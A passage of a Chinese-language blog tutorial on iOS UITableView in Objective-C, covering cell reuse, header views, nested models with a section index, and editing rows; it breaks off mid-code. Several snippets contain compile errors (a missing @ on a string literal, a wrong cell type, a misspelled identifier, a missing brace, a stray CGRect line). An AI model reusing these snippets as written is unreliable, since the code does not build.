<h3 id="group"><a href="#group" class="headerlink" title="group:"></a>group:</h3><p>​    section的头部和底部会默认的有一段间距。</p>
<h3 id="数据源调用方法顺序："><a href="#数据源调用方法顺序：" class="headerlink" title="数据源调用方法顺序："></a>数据源调用方法顺序：</h3><p>1.numberOfSectionsInTableView</p>
<p>2.numberOfRowsInSection 调用多遍，上面的方法返回多少组久调用多少次</p>
<p>3.cellForRowAtIndexPath 总共有多少行就调用多少遍</p>
<h2 id="2-headerView的使用"><a href="#2-headerView的使用" class="headerlink" title="2.headerView的使用"></a>2.headerView的使用</h2><p>tableView和section都可以设置headerView:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//tableView</div><div class="line">UIView *headerView = [[UIView alloc]initWithFrame:CGRectMake(0,0,100,100)];</div><div class="line">[headerView setBackgroundColor:[UIColor orangeColor]];</div><div class="line">_tableView.tableHeaderView = headerView;</div><div class="line">//section</div><div class="line">- (UIView *)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section&#123;</div><div class="line">    UIView *headerView = [[UIView alloc]init];</div><div class="line">    [headerView setBackgroundColor:[UIColor redColor]];</div><div class="line">    return headerView;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>效果图：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-01%20%E4%B8%8B%E5%8D%887.52.18.png" alt="屏幕快照 2017-06-01 下午7.52.18.png" title="" class="">
                <p>屏幕快照 2017-06-01 下午7.52.18.png</p>
            </figure> </p>
<h2 id="3-demo展示（英雄属性）"><a href="#3-demo展示（英雄属性）" class="headerlink" title="3.demo展示（英雄属性）"></a>3.demo展示（英雄属性）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div></pre></td><td class="code"><pre><div class="line">#import &quot;ViewController.h&quot;</div><div class="line">#import &quot;HeroModel.h&quot;</div><div class="line"></div><div class="line">@interface ViewController ()&lt;UITableViewDataSource,UITableViewDelegate&gt;</div><div class="line"></div><div class="line">@property (nonatomic, strong) NSArray *dataArray;</div><div class="line">@property (weak, nonatomic) IBOutlet UITableView *tableView;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">#pragma mark -</div><div class="line">#pragma mark -  懒加载</div><div class="line">- (NSArray *)dataArray &#123;</div><div class="line">    if (nil == _dataArray) &#123;</div><div class="line">        // 1. 路径</div><div class="line">        NSString *path = [[NSBundle mainBundle] pathForResource:@&quot;heros.plist&quot; ofType:nil];</div><div class="line">        </div><div class="line">        // 2. 读取内容</div><div class="line">        NSArray *tempArray = [NSArray arrayWithContentsOfFile:path];</div><div class="line">        </div><div class="line">        // 3. 可变数组</div><div class="line">        NSMutableArray *mutable = [NSMutableArray array];</div><div class="line">        </div><div class="line">        // 4. 字典转模型</div><div class="line">        for (NSDictionary *dict in tempArray) &#123;</div><div class="line">            HeroModel *model = [HeroModel heroModelWithDict:dict];</div><div class="line">            </div><div class="line">            [mutable addObject:model];</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        _dataArray = mutable;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    return _dataArray;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    </div><div class="line">    // 设置控制器成为tableView的代理</div><div class="line">    _tableView.delegate = self;</div><div class="line">    </div><div class="line">    // 设置分割线颜色的</div><div class="line">    _tableView.separatorColor = [UIColor redColor];</div><div class="line">    </div><div class="line">    // 侵蚀 , 分割线样式</div><div class="line">    _tableView.separatorStyle = UITableViewCellSeparatorStyleSingleLine;</div><div class="line">    </div><div class="line">    // top, left, bottom, right , 上， 下 是没有效果的</div><div class="line">    _tableView.separatorInset = UIEdgeInsetsMake(0, 0, 0, 0);</div><div class="line">    </div><div class="line">    // 允许多选</div><div class="line">    _tableView.allowsMultipleSelection = YES;</div><div class="line">    </div><div class="line">    // 设置行高 ,（静态设置） 如果每个cell的高度都一样， 推荐这种设置</div><div class="line">//    _tableView.rowHeight = 100;</div><div class="line">    </div><div class="line">    </div><div class="line">//    UIView *headerView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 100, 100)];</div><div class="line">//    [headerView setBackgroundColor:[UIColor orangeColor]];</div><div class="line">//    </div><div class="line">//    _tableView.tableHeaderView = headerView;</div><div class="line">    </div><div class="line">    UIView *footerView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 100, 100)];</div><div class="line">    [footerView setBackgroundColor:[UIColor yellowColor]];</div><div class="line">    </div><div class="line">    _tableView.tableFooterView = footerView;</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line">// indexPath  可以根据具体的某行显示不同的高度</div><div class="line">- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    // 反回不同的高度</div><div class="line">    return 55;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">// 多少组</div><div class="line">- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView &#123;</div><div class="line">    return 1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 多少行</div><div class="line"></div><div class="line">- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section &#123;</div><div class="line">    return self.dataArray.count;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 每一行显示的内容</div><div class="line">- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    // 实例化tableViewcell</div><div class="line">    UITableViewCell *cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:nil];</div><div class="line">    /**</div><div class="line">     UITableViewCellStyleDefault : 不显示detailTextLabel</div><div class="line">     UITableViewCellStyleValue1 ： detailLabel 显示在 textLabel 右侧</div><div class="line">     UITableViewCellStyleValue2 ： imageView不再显示， textLabel居左 变蓝色</div><div class="line">     UITableViewCellStyleSubtitle ：都显示， detailLabel 在 textLabel下侧</div><div class="line">     */</div><div class="line">    </div><div class="line">    // 设置cell上控件的内容</div><div class="line">    HeroModel *model = self.dataArray[indexPath.row];</div><div class="line">    </div><div class="line">    // 设置imageView</div><div class="line">    cell.imageView.image = [UIImage imageNamed:model.icon];</div><div class="line">    </div><div class="line">    // 设置文本</div><div class="line">    cell.textLabel.text = model.name;</div><div class="line">    </div><div class="line">    // 设置detailTextLabel</div><div class="line">    cell.detailTextLabel.text = model.intro;</div><div class="line">    </div><div class="line">    // 设置右侧箭头</div><div class="line">    // accessory : 配件</div><div class="line">    cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;</div><div class="line">    </div><div class="line">    // 设置选择样式</div><div class="line">    /**</div><div class="line">     UITableViewCellSelectionStyleNone,</div><div class="line">     UITableViewCellSelectionStyleBlue,  用灰色来代替了</div><div class="line">     UITableViewCellSelectionStyleGray,</div><div class="line">     UITableViewCellSelectionStyleDefault</div><div class="line">     cell.selectionStyle = UITableViewCellSelectionStyleBlue;</div><div class="line">     */</div><div class="line">    </div><div class="line">    /**</div><div class="line">     设置选中的背景view</div><div class="line">     UIView *tempView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 100, 30)];</div><div class="line">     tempView.backgroundColor = [UIColor yellowColor];</div><div class="line">     </div><div class="line">     cell.selectedBackgroundView = tempView;</div><div class="line">     */</div><div class="line">    </div><div class="line">    // cell.backgroundColor = [UIColor yellowColor];</div><div class="line">    </div><div class="line">    /**</div><div class="line">     accessoryView 自定义控件</div><div class="line">     自定义 accessoryView 的时候， frame中的 坐标（x,y)修改后无效</div><div class="line">     UIView *tempView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 30, 30)];</div><div class="line">     tempView.backgroundColor = [UIColor redColor];</div><div class="line">     </div><div class="line">     cell.accessoryView = tempView;</div><div class="line">     */</div><div class="line">    </div><div class="line">    return cell;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section &#123;</div><div class="line">    </div><div class="line">    return @&quot;英雄&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 可以对 section的header 和 footer 设置view</div><div class="line">- (UIView *)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section &#123;</div><div class="line">    </div><div class="line">    </div><div class="line">    UIView *headerView = [[UIView alloc] init];</div><div class="line">    [headerView setBackgroundColor:[UIColor redColor]];</div><div class="line">    </div><div class="line">    return headerView;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">- (BOOL)prefersStatusBarHidden &#123;</div><div class="line">    return YES;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<p>上述代码虽然能实现基本的功能，但是有一个很大的弊端，就是在拖动tableView的时候，每一次都在不停的创建新的cell，意思就是，当最上方的cell超出屏幕的时候，再一次往上拖动的时候就会重新实例化一个对象。</p>
<p>cell重用机制：</p>
<p>1.通过重用标识符在缓存池中去寻找对应的的cell</p>
<p>2.进行判断：如果找到，直接拿过来复用，如果找不到就直接实例化一个对象</p>
<p>3.把旧的数据覆盖掉</p>
<p>优化后的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//避免多次分配内存，先定义重用标识符</div><div class="line">static NSString *identifier = &quot;heroCell&quot;; </div><div class="line">//到缓存池中去寻找cell，将标识符设置为&quot;heroCell&quot;</div><div class="line">UITableView *cell = [tableView dequeueReusableCellWithIdentifier:identifier];</div><div class="line">//判断是否找到</div><div class="line">if (nil == cell) &#123;</div><div class="line"> cell = [[UITableViewCell alloc]initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:indentifier];</div><div class="line">&#125;</div><div class="line">//如果找到之后就进行数据的复写，没有找到就是直接赋值</div></pre></td></tr></table></figure>
<h2 id="4-实现数据模型的嵌套和索引"><a href="#4-实现数据模型的嵌套和索引" class="headerlink" title="4.实现数据模型的嵌套和索引"></a>4.实现数据模型的嵌套和索引</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line">#import &quot;ViewController.h&quot;</div><div class="line">#import &quot;CarModel.h&quot;</div><div class="line">#import &quot;InnerCarModel.h&quot;</div><div class="line"></div><div class="line">@interface ViewController ()&lt;UITableViewDataSource&gt;</div><div class="line"></div><div class="line">@property (nonatomic, strong) NSArray *dataArray;</div><div class="line"></div><div class="line">@property (nonatomic, strong) NSArray *indexArray;</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line"></div><div class="line">#pragma mark -</div><div class="line">#pragma mark -  懒加载</div><div class="line">- (NSArray *)dataArray &#123;</div><div class="line">    if (nil == _dataArray) &#123;</div><div class="line">        </div><div class="line">        // 1. 路径</div><div class="line">        NSString *path = [[NSBundle mainBundle] pathForResource:@&quot;cars_total.plist&quot; ofType:nil];</div><div class="line">        </div><div class="line">        // 2. 读取</div><div class="line">        NSArray *tempArray = [NSArray arrayWithContentsOfFile:path];</div><div class="line">        </div><div class="line">        // 3. 临时可变数组</div><div class="line">        NSMutableArray *mutal = [NSMutableArray array];</div><div class="line">        </div><div class="line">        // 4. 转模型</div><div class="line">        for (NSDictionary *dict in tempArray) &#123;</div><div class="line">            CarModel *model = [CarModel carModelWithDict: dict];</div><div class="line">            </div><div class="line">            [mutal addObject:model];</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        // 把carModel中title 放入数组， 用作后面的索引返回值</div><div class="line">        _indexArray = [mutal valueForKeyPath:@&quot;title&quot;];</div><div class="line">        </div><div class="line">        _dataArray = mutal;</div><div class="line"></div><div class="line">    return _dataArray;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    // Do any additional setup after loading the view, typically from a nib.</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">// 多少组</div><div class="line">- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView &#123;</div><div class="line">    return self.dataArray.count;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 多少行</div><div class="line">- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section &#123;</div><div class="line">    CarModel *carModel = self.dataArray[section];</div><div class="line">    </div><div class="line">    return carModel.cars.count;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 每一行显示的内容</div><div class="line">- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    // 1. 定义一个重用标识符</div><div class="line">    static NSString *identifier = @&quot;settingCell&quot;;</div><div class="line">    </div><div class="line">    // 2. 到缓存池中去找对应的cell， 根据重用标识符</div><div class="line">    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:identifier];</div><div class="line">    </div><div class="line">    // 3. 判断是否找到， 如果找不到， 就重新实例化cell</div><div class="line">    if (nil == cell) &#123;</div><div class="line">        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:identifier];</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    CGRect</div><div class="line">    // 4. 设置数据</div><div class="line">    // 先取出该组对应的model</div><div class="line">    CarModel *carModel = self.dataArray[indexPath.section];</div><div class="line">    </div><div class="line">    // 再取出该组中行对应的model</div><div class="line">    InnerCarModel *innerCarModel = carModel.cars[indexPath.row];</div><div class="line">    </div><div class="line">    // 对cell的控件进行赋值</div><div class="line">    cell.imageView.image = [UIImage imageNamed:innerCarModel.icon];</div><div class="line">    </div><div class="line">    cell.textLabel.text = innerCarModel.name;</div><div class="line">    </div><div class="line">    return cell;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section &#123;</div><div class="line">    // 取出carModel</div><div class="line">    CarModel *carModel = self.dataArray[section];</div><div class="line">    </div><div class="line">    return carModel.title;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (NSArray&lt;NSString *&gt; *)sectionIndexTitlesForTableView:(UITableView *)tableView &#123;</div><div class="line">    </div><div class="line">    return _indexArray;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">- (BOOL)prefersStatusBarHidden &#123;</div><div class="line">    return YES;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">//嵌套在CarModel中的InnerCarModel</div><div class="line">#import &quot;CarModel.h&quot;</div><div class="line">#import &quot;InnerCarModel.h&quot;</div><div class="line"></div><div class="line">@implementation CarModel</div><div class="line"></div><div class="line">- (instancetype)initWithDict:(NSDictionary *)dict &#123;</div><div class="line">    if (self = [super init]) &#123;</div><div class="line">        </div><div class="line">        [self setValuesForKeysWithDictionary:dict];</div><div class="line">        // 经过kvc赋值之后， 现在 cars 这个数组中有值， 而且存放的是 字典</div><div class="line">        // 1. 定义一个临时可变数组</div><div class="line">        NSMutableArray *mutable = [NSMutableArray array];</div><div class="line">        </div><div class="line">        // 2. 转</div><div class="line">        for (NSDictionary *dict in self.cars) &#123;</div><div class="line">            InnerCarModel *innerModel = [InnerCarModel innerCarModelWithDict:dict];</div><div class="line">            </div><div class="line">            // 添加到可变数组中</div><div class="line">            [mutable addObject:innerModel];</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        // 把可变数组赋值给 self.cars , mutable 数组中装的是 InnerCarModel对象</div><div class="line">        self.cars = mutable;</div><div class="line">    &#125;</div><div class="line">    return self;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (instancetype)carModelWithDict:(NSDictionary *)dict &#123;</div><div class="line">    return [[self alloc] initWithDict:dict];</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<h2 id="5-对cell的编辑（修改处）"><a href="#5-对cell的编辑（修改处）" class="headerlink" title="5.对cell的编辑（修改处）"></a>5.对cell的编辑（修改处）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div></pre></td><td class="code"><pre><div class="line">@interface ViewController ()&lt;UITableViewDataSource,UITableViewDelegate,UIAlertViewDelegate&gt;</div><div class="line">//因为要对数据源进行修改，所以要用一个可变数组，同时还要加入新的协议</div><div class="line">- (NSMutableArray *)dataArray &#123;</div><div class="line">    if (nil == _dataArray) &#123;</div><div class="line">        </div><div class="line">        // 实例化 dataArray</div><div class="line">#warning 不要忘记实例化 dataArray数组</div><div class="line">        _dataArray = [NSMutableArray array];</div><div class="line">        </div><div class="line">        // 1. 路径</div><div class="line">        NSString *path = [[NSBundle mainBundle] pathForResource:@&quot;heros.plist&quot; ofType:nil];</div><div class="line">        </div><div class="line">        // 2. 读取内容</div><div class="line">        NSArray *tempArray = [NSArray arrayWithContentsOfFile:path];</div><div class="line">        </div><div class="line">        // 3. 可变数组</div><div class="line">//        NSMutableArray *mutable = [NSMutableArray array];</div><div class="line">        </div><div class="line">        // 4. 字典转模型</div><div class="line">        for (NSDictionary *dict in tempArray) &#123;</div><div class="line">            HeroModel *model = [HeroModel heroModelWithDict:dict];</div><div class="line">            </div><div class="line">            [_dataArray addObject:model];</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">//        _dataArray = mutable;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    return _dataArray;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 当cell 被选中的时候 ， 就会调用</div><div class="line">- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    </div><div class="line">    // 取出数组中对应的model</div><div class="line">    HeroModel *heroModel = self.dataArray[indexPath.row];</div><div class="line">   </div><div class="line">    // 弹出提示框</div><div class="line">    UIAlertView *alertView = [[UIAlertView alloc]</div><div class="line">                              initWithTitle:@&quot;编辑&quot;                                                  message:nil</div><div class="line">                                                       delegate:self</div><div class="line">                                              cancelButtonTitle:@&quot;取消&quot;</div><div class="line">                                              otherButtonTitles:@&quot;确定&quot;, nil];</div><div class="line">    </div><div class="line">    // 显示输入框</div><div class="line">    /**</div><div class="line">     UIAlertViewStyleDefault = 0,</div><div class="line">     UIAlertViewStyleSecureTextInput,</div><div class="line">     UIAlertViewStylePlainTextInput,</div><div class="line">     UIAlertViewStyleLoginAndPasswordInput</div><div class="line">     */</div><div class="line">    alertView.alertViewStyle = UIAlertViewStylePlainTextInput;</div><div class="line">    </div><div class="line">    </div><div class="line">    // 把英雄的名字赋值给 alertView中textField</div><div class="line">    // 取出aletView的 textField</div><div class="line">    UITextField *textField = [alertView textFieldAtIndex:0];</div><div class="line">    </div><div class="line">    textField.text = heroModel.name;</div><div class="line">    </div><div class="line">    // 点击cell的时候， 把row 设置给alertView的tag属性</div><div class="line">    alertView.tag = indexPath.row;</div><div class="line">    </div><div class="line">    </div><div class="line">    // 展示alertView</div><div class="line">    [alertView show];</div><div class="line">   </div><div class="line">&#125;</div><div class="line"></div><div class="line">#pragma mark -</div><div class="line">#pragma mark -  alertView的代理方法</div><div class="line">- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex &#123;</div><div class="line">    </div><div class="line">    if (buttonIndex == 1) &#123; // 点击了确定按钮</div><div class="line">        /**</div><div class="line">         修改数据显示， 修改英雄的名字</div><div class="line">         */</div><div class="line">        </div><div class="line">        // 取出 alertView中的文本输入框</div><div class="line">        UITextField *textField = [alertView textFieldAtIndex:0];</div><div class="line">        </div><div class="line">        // 修改过之后的名字</div><div class="line">        NSString *newName = textField.text;</div><div class="line">        </div><div class="line">        // 修改数据源中 的 英雄名字</div><div class="line">        // 取出alertView 的tag , 点击的某个行</div><div class="line">        NSInteger index = alertView.tag;</div><div class="line">        </div><div class="line">        // 取出点击行所对应的 数据源中的模型</div><div class="line">        HeroModel *model = self.dataArray[index];</div><div class="line">        </div><div class="line">        // 修改model中的 name属性</div><div class="line">        model.name = newName;</div><div class="line">        </div><div class="line">        </div><div class="line">        // 刷新tableView中的数据, 对所有数据进行刷新</div><div class="line">//        [_tableView reloadData];</div><div class="line">        </div><div class="line">        </div><div class="line">        // 对某一行cell的数据进行刷新</div><div class="line">        NSIndexPath *indexPath = [NSIndexPath indexPathForRow:index inSection:0];</div><div class="line">        [_tableView reloadRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft];</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="6实现插入和删除"><a href="#6实现插入和删除" class="headerlink" title="6实现插入和删除"></a>6实现插入和删除</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    </div><div class="line">    // 